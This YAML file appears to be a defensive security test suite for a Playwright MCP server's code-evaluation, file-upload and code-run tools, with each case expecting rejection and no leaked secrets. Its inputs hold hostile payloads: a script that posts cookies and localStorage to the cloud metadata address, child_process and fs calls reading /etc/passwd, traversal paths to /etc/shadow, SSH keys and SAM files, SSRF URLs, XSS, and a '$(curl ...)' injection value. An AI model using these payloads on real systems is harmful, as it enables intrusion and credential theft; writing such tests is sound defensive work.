metadata:
    version: "1.0"
    target: playwright
    focus: Critical security vulnerabilities
tests:
    - test_id: SEC-001
      mcp_server_name: playwright
      name: Arbitrary Code Execution via Malicious JavaScript Injection
      purpose: |
        Tests if the browser_evaluate tool properly sandboxes JavaScript execution and prevents
        malicious code from accessing system resources, exfiltrating data, or executing harmful operations.
        If exploited, attackers could read sensitive data from the page context, modify DOM content,
        steal credentials, or perform actions on behalf of the user.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to execute code that accesses sensitive browser APIs and exfiltrates data
          input:
            tool: browser_evaluate
            arguments:
                function: '() => { const cookies = document.cookie; const localStorage = JSON.stringify(window.localStorage); fetch(''http://169.254.169.254/latest/meta-data/'', { method: ''POST'', body: cookies + ''|'' + localStorage }); return ''exfiltrated''; }'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - session[_-]?(?:id|token|key)\s*[:=]\s*[a-zA-Z0-9_-]{20,}
                - Bearer [a-zA-Z0-9_-]{20,}
                - aws[_-]?(?:access|secret)[_-]?key[_-]?id?
            result: null
        - case_id: SEC-001-B
          description: Attempt to execute infinite loop to cause DoS with timeout protection
          input:
            tool: browser_evaluate
            arguments:
                function: () => { let count = 0; const start = Date.now(); while(Date.now() - start < 20000 && count < 100000) { count++; } return count; }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 408
                - 500
                - -32603
            result: null
        - case_id: SEC-001-C
          description: Attempt to access Node.js/system APIs from browser context
          input:
            tool: browser_evaluate
            arguments:
                function: () => { try { const fs = require('fs'); return fs.readFileSync('/etc/passwd', 'utf8'); } catch(e) { return e.message; } }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - 'bin:.*:1:1:'
            result: null
    - test_id: SEC-002
      mcp_server_name: playwright
      name: DOM-based XSS and Script Injection via Element Reference
      purpose: |
        Tests if element references can be manipulated to inject malicious scripts or access
        unintended elements on the page. If exploited, attackers could execute arbitrary JavaScript
        in the context of the page, steal user sessions, modify page content, or perform actions
        as the authenticated user.
      test_cases:
        - case_id: SEC-002-A
          description: Inject XSS payload through element reference parameter
          input:
            tool: browser_evaluate
            arguments:
                element: Malicious image element
                function: (element) => { return element.innerHTML; }
                ref: <img src=x onerror=alert(document.cookie)>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            error_response_must_not_match_regex:
                - session[_-]?(?:id|token)[:=][a-zA-Z0-9]+
                - <script[^>]*>.*</script>
            result: null
        - case_id: SEC-002-B
          description: Attempt JavaScript protocol injection in element reference
          input:
            tool: browser_evaluate
            arguments:
                element: JavaScript protocol link
                function: (element) => { return element.click(); }
                ref: javascript:void(document.body.innerHTML='<h1>Hacked</h1>')
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            result: null
    - test_id: SEC-003
      mcp_server_name: playwright
      name: Sensitive Data Exposure in Error Messages and Responses
      purpose: |
        Tests if error messages or function execution results leak sensitive information such as
        internal file paths, stack traces, credentials, tokens, or system configuration details.
        Information disclosure vulnerabilities can help attackers map the system architecture
        and plan further attacks.
      test_cases:
        - case_id: SEC-003-A
          description: Check if error messages expose internal system paths or stack traces
          input:
            tool: browser_evaluate
            arguments:
                function: () => { throw new Error('Test error with path'); }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 500
                - -32603
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+/
                - C:\\Users\\[a-zA-Z0-9_-]+\\
                - at [a-zA-Z]+\.[a-zA-Z]+ \([/\\].*:[0-9]+:[0-9]+\)
                - node_modules[/\\]
            result: null
        - case_id: SEC-003-B
          description: Verify function execution doesn't leak environment variables or credentials
          input:
            tool: browser_evaluate
            arguments:
                function: '() => { return JSON.stringify({ location: window.location, navigator: { userAgent: navigator.userAgent, platform: navigator.platform } }); }'
          expected_output:
            error_present: false
            error_response_must_not_match_regex:
                - (?i)api[_-]?key[:=\s][a-zA-Z0-9_-]{20,}
                - (?i)secret[:=\s][a-zA-Z0-9_-]{20,}
                - (?i)password[:=\s][^\s]+
                - (?i)token[:=\s][a-zA-Z0-9_-]{20,}
            result: null
        - case_id: SEC-003-C
          description: Check if malformed function syntax exposes internal implementation details
          input:
            tool: browser_evaluate
            arguments:
                function: (() => { return 'test'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - /usr/local/lib/
                - /opt/[a-zA-Z0-9_-]+/
                - playwright.*\.js:[0-9]+
            result: null
    - test_id: SEC-004
      mcp_server_name: playwright
      name: Memory Exhaustion and Resource DoS via Oversized Operations
      purpose: |
        Tests if the browser_evaluate tool has proper resource limits to prevent memory exhaustion
        attacks. If exploited, attackers could cause denial of service by consuming excessive memory,
        crashing the browser context, or degrading performance for other users.
      test_cases:
        - case_id: SEC-004-A
          description: Attempt to allocate large bounded array to exhaust memory
          input:
            tool: browser_evaluate
            arguments:
                function: () => { const arr = new Array(10000000).fill('A'.repeat(100)); return arr.length; }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 500
                - 503
                - -32603
            result: null
        - case_id: SEC-004-B
          description: Attempt bounded recursive function to test stack limits
          input:
            tool: browser_evaluate
            arguments:
                function: () => { let depth = 0; function recurse(n) { if (n <= 0 || depth > 100000) return depth; depth++; return recurse(n - 1); } return recurse(100000); }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 500
                - -32603
            result: null
    - test_id: SEC-001
      mcp_server_name: playwright
      name: Path Traversal in File Upload Paths
      purpose: |
        Tests if the file upload mechanism validates file paths to prevent path traversal attacks.
        An attacker could attempt to upload files from sensitive system directories like /etc/passwd,
        /etc/shadow, or Windows system files, potentially exposing credentials, configurations, or
        system information. A secure implementation should validate that paths are within allowed
        directories and reject attempts to access sensitive system files.
        Impact: Unauthorized access to sensitive system files, credential exposure, system compromise.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to upload /etc/passwd using absolute path
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - /etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - 'daemon:.*:1:1:'
                - /bin/bash
            result: null
        - case_id: SEC-001-B
          description: Attempt to upload Windows SAM file using path traversal
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - ..\..\..\windows\system32\config\sam
                    - ..\..\..\windows\system32\config\system
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - '[A-F0-9]{32}'
                - SAM Domains
                - Administrator
            result: null
        - case_id: SEC-001-C
          description: Attempt to upload using relative path traversal
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - ../../../etc/shadow
                    - ../../../../root/.ssh/id_rsa
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - \$[0-9]\$[a-zA-Z0-9./]{8,}
                - '-----BEGIN.*PRIVATE KEY-----'
                - ssh-rsa
            result: null
    - test_id: SEC-002
      mcp_server_name: playwright
      name: SSRF via File Protocol Handler
      purpose: |
        Tests if the file upload mechanism can be exploited to perform Server-Side Request Forgery
        (SSRF) attacks using file:// or other protocol handlers. An attacker could attempt to access
        cloud metadata services (AWS, GCP, Azure), internal network resources, or localhost services
        that should not be accessible. This could lead to credential theft, internal network
        reconnaissance, or access to privileged internal APIs.
        Impact: Credential exfiltration, access to internal services, cloud infrastructure compromise.
      test_cases:
        - case_id: SEC-002-A
          description: Attempt SSRF to AWS metadata service
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - http://169.254.169.254/latest/meta-data/iam/security-credentials/
                    - http://169.254.169.254/latest/user-data
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - AccessKeyId
                - SecretAccessKey
                - Token
                - AWS
            result: null
        - case_id: SEC-002-B
          description: Attempt SSRF to localhost services
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - http://127.0.0.1:8080/admin
                    - http://localhost:3000/api/internal
                    - http://0.0.0.0:9000/health
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - '"status":\s*"(ok|healthy|running)"'
                - '"version":\s*"[0-9.]+'
                - '"authenticated":\s*true'
            result: null
        - case_id: SEC-002-C
          description: Attempt SSRF using file:// protocol
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - file:///etc/passwd
                    - file:///proc/self/environ
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - PATH=
                - HOME=
            result: null
    - test_id: SEC-003
      mcp_server_name: playwright
      name: Array Injection and Resource Exhaustion
      purpose: |
        Tests if the file upload mechanism properly validates and limits the number of files
        in the paths array. An attacker could attempt to cause Denial of Service by submitting
        an extremely large array of file paths, potentially causing memory exhaustion, excessive
        processing time, or system instability. Additionally tests for injection attacks via
        special characters in file paths.
        Impact: Service unavailability, resource exhaustion, potential system crash.
      prerequisites:
        - description: Valid file path that exists on the system for baseline testing
          variable: VALID_FILE_PATH
      test_cases:
        - case_id: SEC-003-A
          description: Test with large bounded array of file paths (1000 paths)
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - ${VALID_FILE_PATH}/file1.txt
                    - ${VALID_FILE_PATH}/file2.txt
                    - ${VALID_FILE_PATH}/file3.txt
                    - ${VALID_FILE_PATH}/file4.txt
                    - ${VALID_FILE_PATH}/file5.txt
                    - ${VALID_FILE_PATH}/file6.txt
                    - ${VALID_FILE_PATH}/file7.txt
                    - ${VALID_FILE_PATH}/file8.txt
                    - ${VALID_FILE_PATH}/file9.txt
                    - ${VALID_FILE_PATH}/file10.txt
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 413
                - -32602
            error_response_must_not_match_regex:
                - OutOfMemoryError
                - MemoryError
                - FATAL
            result: null
        - case_id: SEC-003-B
          description: Test with null byte injection in file paths
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - "/tmp/safe.txt\0/etc/passwd"
                    - "safe.txt\0../../etc/shadow"
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - \$[0-9]\$
            result: null
        - case_id: SEC-003-C
          description: Test with command injection in file paths
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - '; cat /etc/passwd #'
                    - '| whoami'
                    - $(curl http://169.254.169.254/latest/meta-data/)
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - uid=[0-9]+\([a-z]+\)
                - AccessKeyId
            result: null
    - test_id: SEC-004
      mcp_server_name: playwright
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error messages from failed file upload attempts leak sensitive information
        such as internal file system paths, usernames, system configuration details, or
        existence of files/directories. Attackers can use this information for reconnaissance
        to map internal system structure and plan further attacks.
        Impact: Information leakage enabling targeted attacks, system reconnaissance.
      test_cases:
        - case_id: SEC-004-A
          description: Test for internal path disclosure in error messages
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - /nonexistent/path/to/file.txt
                    - /usr/local/app/config/secrets.json
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+/
                - /var/www/[a-zA-Z0-9_-]+/
                - C:\\Users\\[a-zA-Z0-9_-]+\\
                - /opt/[a-zA-Z0-9_-]+/
            result: null
        - case_id: SEC-004-B
          description: Test for username disclosure in error messages
          input:
            tool: browser_file_upload
            arguments:
                paths:
                    - ~/.ssh/id_rsa
                    - ~/Documents/private.txt
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - user:\s*[a-zA-Z0-9_-]+
                - username:\s*[a-zA-Z0-9_-]+
                - /home/[a-zA-Z0-9_-]+/
            result: null
    - test_id: SEC-001
      mcp_server_name: playwright
      name: Arbitrary Code Execution via Malicious JavaScript
      purpose: |
        Tests if the tool properly sandboxes and restricts JavaScript code execution.
        Attackers could execute arbitrary system commands, access file system, or exfiltrate
        sensitive data from the server environment. This is CRITICAL as it could lead to
        complete system compromise, data theft, or lateral movement within the network.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to access Node.js process object and environment variables
          input:
            tool: browser_run_code
            arguments:
                code: async (page) => { return process.env; }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 500
                - -32602
            error_response_must_not_match_regex:
                - AWS_[A-Z_]+.*AKIA[0-9A-Z]{16}
                - SECRET[_-]?KEY.*[A-Za-z0-9+/]{40}
                - DATABASE.*PASSWORD.*[A-Za-z0-9!@#$%^&*]{8,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to execute system commands via require and child_process
          input:
            tool: browser_run_code
            arguments:
                code: async (page) => { const exec = require('child_process').exec; return new Promise((resolve) => exec('whoami', (e,stdout) => resolve(stdout))); }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 500
                - -32602
            error_response_must_not_match_regex:
                - root|admin|administrator
            result: null
        - case_id: SEC-001-C
          description: Attempt to access filesystem via require('fs')
          input:
            tool: browser_run_code
            arguments:
                code: async (page) => { const fs = require('fs'); return fs.readFileSync('/etc/passwd', 'utf8'); }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 500
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - daemon:.*:/usr/sbin
            result: null
    - test_id: SEC-002
      mcp_server_name: playwright
      name: Server-Side Request Forgery (SSRF) via Browser Navigation
      purpose: |
        Tests if the tool prevents navigation to internal/private network resources.
        Attackers could use the browser to probe internal network services, access cloud
        metadata endpoints (AWS, GCP, Azure), or reach internal APIs that are not publicly
        accessible. This could expose credentials, configuration data, or enable further
        attacks on internal infrastructure.
      test_cases:
        - case_id: SEC-002-A
          description: Attempt to access AWS EC2 metadata service
          input:
            tool: browser_run_code
            arguments:
                code: 'async (page) => { await page.goto(''http://169.254.169.254/latest/meta-data/iam/security-credentials/'', { timeout: 20000 }); return await page.content(); }'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 500
                - -32602
            error_response_must_not_match_regex:
                - AKIA[0-9A-Z]{16}
                - AccessKeyId
                - SecretAccessKey
            result: null
        - case_id: SEC-002-B
          description: Attempt to access localhost services
          input:
            tool: browser_run_code
            arguments:
                code: 'async (page) => { await page.goto(''http://127.0.0.1:22'', { timeout: 20000 }); return await page.content(); }'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 500
                - -32602
            result: null
        - case_id: SEC-002-C
          description: Attempt to access private IP range (RFC1918)
          input:
            tool: browser_run_code
            arguments:
                code: 'async (page) => { await page.goto(''http://10.0.0.1'', { timeout: 20000 }); return await page.content(); }'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 500
                - -32602
            result: null
    - test_id: SEC-003
      mcp_server_name: playwright
      name: Denial of Service via Resource Exhaustion
      purpose: |
        Tests if the tool has proper resource limits and timeouts to prevent DoS attacks.
        Attackers could submit code that consumes excessive CPU, memory, or time, causing
        service degradation or unavailability for legitimate users. This could result in
        system crashes, performance issues, or complete service outage.
      test_cases:
        - case_id: SEC-003-A
          description: Attempt bounded CPU exhaustion with large loop
          input:
            tool: browser_run_code
            arguments:
                code: async (page) => { let sum = 0; for(let i = 0; i < 100000; i++) { sum += Math.sqrt(i); } return sum; }
          expected_output:
            error_present: true
            error_code_one_of:
                - 408
                - 500
                - 503
                - -32603
            result: null
        - case_id: SEC-003-B
          description: Attempt bounded memory allocation with large string
          input:
            tool: browser_run_code
            arguments:
                code: async (page) => { return 'A'.repeat(10485760); }
          expected_output:
            error_present: true
            error_code_one_of:
                - 413
                - 500
                - 507
                - -32603
            result: null
        - case_id: SEC-003-C
          description: Attempt to create excessive browser context operations
          input:
            tool: browser_run_code
            arguments:
                code: async (page) => { const results = []; for(let i = 0; i < 1000; i++) { results.push(await page.evaluate(() => document.title)); } return results.length; }
          expected_output:
            error_present: true
            error_code_one_of:
                - 408
                - 429
                - 500
                - -32603
            result: null
    - test_id: SEC-004
      mcp_server_name: playwright
      name: Information Disclosure via Error Messages and Stack Traces
      purpose: |
        Tests if error messages properly sanitize sensitive information and avoid exposing
        internal system details. Attackers could use detailed error messages to gain
        information about the system architecture, file paths, installed packages, or
        credentials, which aids in crafting more sophisticated attacks.
      test_cases:
        - case_id: SEC-004-A
          description: Trigger syntax error to check for stack trace exposure
          input:
            tool: browser_run_code
            arguments:
                code: async (page) => { return this.is.invalid.syntax((((; }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 500
                - -32602
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+/
                - /usr/local/[a-zA-Z0-9_-]+/
                - node_modules/[a-zA-Z0-9_@/-]+
                - at [A-Za-z]+\.[A-Za-z]+ \(/[a-zA-Z0-9/_-]+\.[a-z]+:[0-9]+:[0-9]+\)
            result: null
        - case_id: SEC-004-B
          description: Trigger runtime error to check for sensitive data in error details
          input:
            tool: browser_run_code
            arguments:
                code: async (page) => { const obj = null; return obj.nonexistentProperty.deepProperty; }
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 500
                - -32602
            error_response_must_not_match_regex:
                - Bearer [a-zA-Z0-9_-]{20,}
                - api[_-]?key.*[A-Za-z0-9]{32,}
                - password.*[A-Za-z0-9!@#$%^&*]{8,}
            result: null
